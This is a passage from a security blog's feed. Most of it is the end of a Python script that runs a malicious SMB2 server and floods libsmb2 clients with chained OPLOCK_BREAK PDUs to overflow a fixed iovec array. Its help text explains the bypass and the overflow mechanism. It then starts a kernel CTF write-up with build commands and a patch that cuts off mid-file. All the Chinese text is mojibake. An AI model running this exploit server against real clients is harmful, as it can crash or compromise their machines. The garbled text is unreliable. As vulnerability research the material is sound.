self.create_normal_smb2_response(command=smb2_command, message_id=message_id)</span><br><span class="line">                                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] âœ… å‘é€å•ä¸ª<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>å“åº”ï¼ˆéé“¾å¼ï¼‰&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="comment"># å…¶ä»–SMBå‘½ä»¤ä½¿ç”¨é“¾å¼å¤„ç†</span></span><br><span class="line">                                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] ä¸º<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>ç”Ÿæˆé“¾å¼å“åº”&quot;</span>)</span><br><span class="line">                                chain_data = self.create_chain_pdu_sequence(base_command=smb2_command, pdu_count=self.chain_count, original_message_id=message_id)</span><br><span class="line">                                netbios_header = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="built_in">len</span>(chain_data))</span><br><span class="line">                                response_data = netbios_header + chain_data</span><br><span class="line">                                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] âœ… å‘é€æ··åˆæ”»å‡»é“¾å¼<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>å“åº”ï¼ˆ1ä¸ªæ­£å¸¸PDU + <span class="subst">&#123;self.chain_count-<span class="number">1</span>&#125;</span>ä¸ªOPLOCK_BREAK PDUï¼‰&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] éSMB2åè®®æ•°æ®&quot;</span>)</span><br><span class="line">                            logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] åè®®æ ‡è¯†: <span class="subst">&#123;hexlify(smb2_data[:<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å‘é€å“åº”</span></span><br><span class="line">                <span class="keyword">if</span> response_data:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å“åº”å¤§å°: <span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å“åº”å‰64å­—èŠ‚: <span class="subst">&#123;hexlify(response_data[:<span class="number">64</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># åˆ†å—å‘é€</span></span><br><span class="line">                    chunk_size = <span class="number">4096</span></span><br><span class="line">                    total_sent = <span class="number">0</span></span><br><span class="line">                    send_start_time = time.time()</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">while</span> total_sent &lt; <span class="built_in">len</span>(response_data):</span><br><span class="line">                        chunk_end = <span class="built_in">min</span>(total_sent + chunk_size, <span class="built_in">len</span>(response_data))</span><br><span class="line">                        chunk = response_data[total_sent:chunk_end]</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            sent = client_socket.send(chunk)</span><br><span class="line">                            <span class="keyword">if</span> sent == <span class="number">0</span>:</span><br><span class="line">                                logger.error(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å‘é€å¤±è´¥ï¼Œè¿æ¥å¯èƒ½å·²æ–­å¼€&quot;</span>)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                                </span><br><span class="line">                            total_sent += sent</span><br><span class="line">                            logger.debug(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å‘é€è¿›åº¦: <span class="subst">&#123;total_sent&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">                            logger.error(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å‘é€æ•°æ®æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                            </span><br><span class="line">                        <span class="comment"># æ·»åŠ å°å»¶æ—¶</span></span><br><span class="line">                        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">                    </span><br><span class="line">                    send_duration = time.time() - send_start_time</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] æ€»å…±å‘é€: <span class="subst">&#123;total_sent&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> å­—èŠ‚ï¼Œè€—æ—¶: <span class="subst">&#123;send_duration:<span class="number">.3</span>f&#125;</span>ç§’&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] æœªç”Ÿæˆå“åº”æ•°æ®&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç­‰å¾…è§‚å¯Ÿå®¢æˆ·ç«¯ååº”</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] æ”¶åˆ°åç»­æ•°æ®: <span class="subst">&#123;<span class="built_in">len</span>(response)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                    logger.debug(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] åç»­æ•°æ®: <span class="subst">&#123;hexlify(response[:<span class="number">64</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] è¯»å–åç»­æ•°æ®å¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">            logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] è¿æ¥è¢«å¯¹æ–¹é‡ç½®&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> BrokenPipeError:</span><br><span class="line">            logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] ç®¡é“æ–­å¼€ - å®¢æˆ·ç«¯å·²æ–­å¼€è¿æ¥&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(e, <span class="string">&#x27;errno&#x27;</span>) <span class="keyword">and</span> e.errno == <span class="number">104</span>:  <span class="comment"># Connection reset by peer</span></span><br><span class="line">                logger.warning(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] è¿æ¥è¢«é‡ç½®&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger.error(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] ç½‘ç»œå¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å¤„ç†å¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            logger.debug(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] å¼‚å¸¸è¯¦æƒ…:\n<span class="subst">&#123;traceback.format_exc()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                logger.info(<span class="string">f&quot;[å®¢æˆ·ç«¯ <span class="subst">&#123;client_id&#125;</span>] è¿æ¥å·²å…³é—­&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_server</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¯åŠ¨SMB2æµ‹è¯•æœåŠ¡å™¨&quot;&quot;&quot;</span></span><br><span class="line">        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server_socket.bind((self.host, self.port))</span><br><span class="line">            server_socket.listen(<span class="number">10</span>)</span><br><span class="line">            </span><br><span class="line">            logger.info(<span class="string">f&quot;ğŸš€ SMB2æµ‹è¯•æœåŠ¡å™¨å·²å¯åŠ¨&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;ğŸš€ ç›‘å¬åœ°å€: <span class="subst">&#123;self.host&#125;</span>:<span class="subst">&#123;self.port&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;ğŸš€ å¤„ç†ç­–ç•¥:&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   ğŸ“‹ åŸºç¡€æ¡æ‰‹é˜¶æ®µ (NEGOTIATE/SESSION_SETUP/TREE_CONNECT): å‘é€å•ä¸ªæ­£å¸¸å“åº”&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   ğŸš¨ å…¶ä»–SMBå‘½ä»¤: å‘é€æ··åˆæ”»å‡»é“¾å¼PDU (<span class="subst">&#123;self.chain_count&#125;</span> ä¸ª)&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   ğŸ’¥ æ”»å‡»æœºåˆ¶: ç¬¬1ä¸ªPDUé€šè¿‡éªŒè¯ï¼Œåç»­OPLOCK_BREAK PDUç»•è¿‡message_idæ£€æŸ¥&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;ğŸš€ ç­‰å¾… SMB2 å®¢æˆ·ç«¯è¿æ¥...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    client_socket, client_addr = server_socket.accept()</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯åˆ›å»ºå¤„ç†çº¿ç¨‹</span></span><br><span class="line">                    client_thread = threading.Thread(</span><br><span class="line">                        target=self.handle_client_connection,</span><br><span class="line">                        args=(client_socket, client_addr),</span><br><span class="line">                        daemon=<span class="literal">True</span></span><br><span class="line">                    )</span><br><span class="line">                    client_thread.start()</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                    logger.info(<span class="string">&quot;æ”¶åˆ°ä¸­æ–­ä¿¡å·ï¼Œæ­£åœ¨å…³é—­æœåŠ¡å™¨...&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logger.error(<span class="string">f&quot;æ¥å—è¿æ¥æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">except</span> PermissionError:</span><br><span class="line">            logger.error(<span class="string">f&quot;æƒé™ä¸è¶³ï¼Œæ— æ³•ç»‘å®šç«¯å£ <span class="subst">&#123;self.port&#125;</span>&quot;</span>)</span><br><span class="line">            logger.error(<span class="string">&quot;è¯·ä½¿ç”¨ sudo è¿è¡Œï¼Œæˆ–è€…ä½¿ç”¨éç‰¹æƒç«¯å£ (&gt;1024)&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;æœåŠ¡å™¨å¯åŠ¨å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            server_socket.close()</span><br><span class="line">            logger.info(<span class="string">&quot;SMB2æµ‹è¯•æœåŠ¡å™¨å·²å…³é—­&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;SMB2 é“¾å¼ PDU æµ‹è¯•æœåŠ¡å™¨&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä½¿ç”¨ç¤ºä¾‹:</span></span><br><span class="line"><span class="string">  sudo python3 smb_hack.py                          # é»˜è®¤é…ç½® (100ä¸ªé“¾å¼PDU)</span></span><br><span class="line"><span class="string">  python3 smb_hack.py -p 8445 --chain-count 200     # éç‰¹æƒç«¯å£ + 200ä¸ªé“¾å¼PDU</span></span><br><span class="line"><span class="string">  python3 smb_hack.py -d --chain-count 50           # è°ƒè¯•æ¨¡å¼ + 50ä¸ªé“¾å¼PDU</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ”»å‡»ç­–ç•¥:</span></span><br><span class="line"><span class="string">  â€¢ åŸºç¡€æ¡æ‰‹é˜¶æ®µ (NEGOTIATE/SESSION_SETUP/TREE_CONNECT): </span></span><br><span class="line"><span class="string">    - å§‹ç»ˆå‘é€å•ä¸ªæ­£å¸¸å“åº”ï¼Œç¡®ä¿è¿æ¥å»ºç«‹æˆåŠŸ</span></span><br><span class="line"><span class="string">  â€¢ å…¶ä»–SMBå‘½ä»¤ (CREATE/READ/WRITE/QUERYç­‰):</span></span><br><span class="line"><span class="string">    - ç¬¬1ä¸ªPDU: ä½¿ç”¨æ­£å¸¸å‘½ä»¤å’ŒåŒ¹é…çš„message_idï¼Œé€šè¿‡éªŒè¯</span></span><br><span class="line"><span class="string">    - åç»­PDU: ä½¿ç”¨OPLOCK_BREAKå‘½ä»¤ï¼Œç»•è¿‡message_idæ£€æŸ¥</span></span><br><span class="line"><span class="string">    - ç›®æ ‡: è§¦å‘å¤§é‡smb2_add_iovectorè°ƒç”¨ï¼Œå¯¼è‡´ç¼“å†²åŒºæº¢å‡º</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">ç¼“å†²åŒºæº¢å‡ºæœºåˆ¶:</span></span><br><span class="line"><span class="string">  â€¢ libsmb2ä¸­smb2_io_vectorsç»“æ„å›ºå®š256ä¸ªiovecæ•°ç»„</span></span><br><span class="line"><span class="string">  â€¢ smb2_add_iovectorå‡½æ•°ç¼ºä¹è¾¹ç•Œæ£€æŸ¥</span></span><br><span class="line"><span class="string">  â€¢ æ¯ä¸ªPDUå¤„ç†ä¼šè°ƒç”¨4-5æ¬¡smb2_add_iovector</span></span><br><span class="line"><span class="string">  â€¢ 200ä¸ªPDUçº¦è§¦å‘1000+æ¬¡è°ƒç”¨ï¼Œè¿œè¶…256é™åˆ¶</span></span><br><span class="line"><span class="string">  â€¢ OPLOCK_BREAKç»•è¿‡message_idåŒ¹é…ï¼Œå®ç°å¤§è§„æ¨¡é“¾å¼æ”»å‡»</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-H&#x27;</span>, <span class="string">&#x27;--host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;ç›‘å¬åœ°å€ (é»˜è®¤: 0.0.0.0)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">445</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;ç›‘å¬ç«¯å£ (é»˜è®¤: 445)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;å¯ç”¨è°ƒè¯•æ¨¡å¼ï¼Œè¾“å‡ºè¯¦ç»†ä¿¡æ¯&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--chain-count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">100</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;é“¾å¼PDUçš„æ•°é‡ (é»˜è®¤: 100, èŒƒå›´: 1-300) - å¤§é‡PDUç”¨äºè§¦å‘ç¼“å†²åŒºæº¢å‡º&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éªŒè¯é“¾å¼PDUæ•°é‡èŒƒå›´</span></span><br><span class="line">    <span class="keyword">if</span> args.chain_count &lt; <span class="number">1</span> <span class="keyword">or</span> args.chain_count &gt; <span class="number">300</span>:</span><br><span class="line">        logger.error(<span class="string">&quot;é“¾å¼PDUæ•°é‡å¿…é¡»åœ¨1-300ä¹‹é—´&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æƒé™æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">if</span> args.port &lt; <span class="number">1024</span> <span class="keyword">and</span> os.geteuid() != <span class="number">0</span>:</span><br><span class="line">        logger.error(<span class="string">f&quot;ä½¿ç”¨ç‰¹æƒç«¯å£ <span class="subst">&#123;args.port&#125;</span> éœ€è¦ root æƒé™&quot;</span>)</span><br><span class="line">        logger.error(<span class="string">&quot;è¯·ä½¿ç”¨ sudo è¿è¡Œï¼Œæˆ–é€‰æ‹©ç«¯å£ &gt;= 1024&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºå¹¶å¯åŠ¨æµ‹è¯•æœåŠ¡å™¨</span></span><br><span class="line">    test_server = ArchSMB2TestServer(</span><br><span class="line">        host=args.host, </span><br><span class="line">        port=args.port, </span><br><span class="line">        debug_mode=args.debug</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¾ç½®é“¾å¼PDUæ•°é‡</span></span><br><span class="line">    test_server.chain_count = args.chain_count</span><br><span class="line">    </span><br><span class="line">    logger.info(<span class="string">f&quot;ğŸš¨ æ··åˆæ”»å‡»é“¾å¼PDUæ•°é‡: <span class="subst">&#123;args.chain_count&#125;</span>&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;ğŸ’¥ æ”»å‡»ç­–ç•¥: ç¬¬1ä¸ªPDUé€šè¿‡message_idéªŒè¯ï¼Œåç»­<span class="subst">&#123;args.chain_count-<span class="number">1</span>&#125;</span>ä¸ªOPLOCK_BREAK PDUç»•è¿‡éªŒè¯&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;ğŸ¯ ç›®æ ‡: è§¦å‘çº¦<span class="subst">&#123;args.chain_count * <span class="number">4</span>&#125;</span>æ¬¡smb2_add_iovectorè°ƒç”¨ï¼Œè¶…è¿‡256é™åˆ¶å¼•å‘ç¼“å†²åŒºæº¢å‡º&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_server.start_server()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logger.info(<span class="string">&quot;ç”¨æˆ·ä¸­æ–­ï¼Œç¨‹åºé€€å‡º&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æˆªæ­¢åˆ°è¯¥æ–‡æ¡£å‘å¸ƒï¼Œç›¸å…³æ¼æ´å‡å·²åœ¨å…¬å¸å†…éƒ¨å’Œä¸Šæ¸¸ä¿®å¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æ•…äº‹çš„å¼€å§‹&lt;/h1&gt;
&lt;p&gt;åœ¨æŸå®‰å…¨å®éªŒå®¤å®ä¹ æœŸé—´ï¼Œæˆ‘ä¸»è¦çš„å·¥ä½œæ˜¯å¼€å‘ä¸€ä¸ªåŸºäºå¤§æ¨¡å‹çš„æ¼æ´æ‰«æå·¥å…·ï¼Œç„¶åæŒ–ç‚¹æ¼æ´ï¼Œå› æ­¤æœ‰äº†è¿™ä¸ªç›®æ ‡ã€‚è¿™ä¸€ç›®æ ‡æ˜¯å…¬å¸å†…æŸäº›</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="exploit" scheme="https://zjw1nd.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>aliyunctf-beebeeå¤ç°</title>
    <link href="https://zjw1nd.github.io/2025/06/08/aliyunctf-beebee%E5%A4%8D%E7%8E%B0/"/>
    <id>https://zjw1nd.github.io/2025/06/08/aliyunctf-beebee%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-06-08T07:44:13.000Z</published>
    <updated>2025-07-22T08:40:22.446Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://bbs.kanxue.com/thread-285786.htm">https://bbs.kanxue.com/thread-285786.htm</a></p></blockquote><h1>é¢˜ç›®å†…å®¹</h1><p>é¢˜ç›®è¯¥ç»™çš„éƒ½ç»™äº†ï¼šä¸€ä¸ªå†…æ ¸ï¼Œä¸€ä¸ªconfigï¼Œä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼Œè¿˜æœ‰ä¸€ä¸ªå‘Šè¯‰æˆ‘ä»¬å¦‚ä½•è‡ªå·±æ‰‹åŠ¨é…ç½®ç¯å¢ƒï¼ˆä¼°è®¡æ˜¯è‡ªå·±buildå¯ä»¥è°ƒè¯•ï¼‰çš„readmeã€‚<br><img src="images/aliyunctf-beebee%E5%A4%8D%E7%8E%B0.md/image.png" alt="alt text"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## How to build your own kernel</span></span><br><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.6.74.tar.xz</span><br><span class="line">tar -xJf linux-6.6.74.tar.xz</span><br><span class="line"><span class="built_in">cp</span> beebee_Kconfig linux-6.6.74/.config</span><br><span class="line"><span class="built_in">cd</span> linux-6.6.74</span><br><span class="line">patch -p1 &lt; ../aliyunctf.patch</span><br><span class="line">make bzImage -j`<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¹¶æ²¡æœ‰ä»€ä¹ˆå†…æ ¸æ¨¡å—ï¼Œé¢˜ç›®çš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ª<a href="#patch">patch</a>.è¿™ä¸ªpatchå¯¹linuxå†…æ ¸çš„ä¸€äº›æ ¸å¿ƒåŠŸèƒ½åšäº†ä¸€ç‚¹ä¿®æ”¹ã€‚å¯åŠ¨å‚æ•°ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M  \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel bzImage    \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0&quot;</span>     \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-drive file=./flag,<span class="keyword">if</span>=virtio,format=raw,<span class="built_in">readonly</span>=on \</span><br><span class="line">-nographic  \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-no-reboot \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€äº†kptrï¼Œå½“æ—¶å’¨è¯¢äº†å†…æ ¸å¤§æ‰‹å­ï¼Œæ ¹æ®configæ¥çœ‹åŸºæœ¬ç»•è¿‡è¿™ä¸ªbpfç›´æ¥ææƒæ˜¯ä¸ç°å®äº†ã€‚å¦å¤–å…³é—­äº†kaslrï¼Œæˆ‘ä»¬çš„åˆ©ç”¨è·¯å¾„å˜å¾—ç®€å•äº†ä¸€ç‚¹ï¼Œåœ¨æ²¡æœ‰æ³„éœ²åŸè¯­çš„æƒ…å†µä¸‹ç›´æ¥ropåº”è¯¥å°±å¯ä»¥ã€‚</p><h2 id="aliyunctf-patch-a-id-patch-a">aliyunctf.patch <a id="patch"></a></h2><p>patchçš„å†…å®¹æ”¾åœ¨è¿™é‡Œï¼š</p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">diff --color -ruN origin/include/linux/bpf.h aliyunctf/include/linux/bpf.h</span><br><span class="line"><span class="comment">--- origin/include/linux/bpf.h2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/include/linux/bpf.h2025-01-24 03:44:01.494468038 -0600</span></span><br><span class="line"><span class="meta">@@ -3058,6 +3058,7 @@</span></span><br><span class="line"> extern const struct bpf_func_proto bpf_user_ringbuf_drain_proto;</span><br><span class="line"> extern const struct bpf_func_proto bpf_cgrp_storage_get_proto;</span><br><span class="line"> extern const struct bpf_func_proto bpf_cgrp_storage_delete_proto;</span><br><span class="line"><span class="addition">+extern const struct bpf_func_proto bpf_aliyunctf_xor_proto;</span></span><br><span class="line"> </span><br><span class="line"> const struct bpf_func_proto *tracing_prog_func_proto(</span><br><span class="line">   enum bpf_func_id func_id, const struct bpf_prog *prog);</span><br><span class="line">diff --color -ruN origin/include/uapi/linux/bpf.h aliyunctf/include/uapi/linux/bpf.h</span><br><span class="line"><span class="comment">--- origin/include/uapi/linux/bpf.h2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/include/uapi/linux/bpf.h2025-01-24 03:44:11.814636836 -0600</span></span><br><span class="line"><span class="meta">@@ -5881,6 +5881,7 @@</span></span><br><span class="line"> 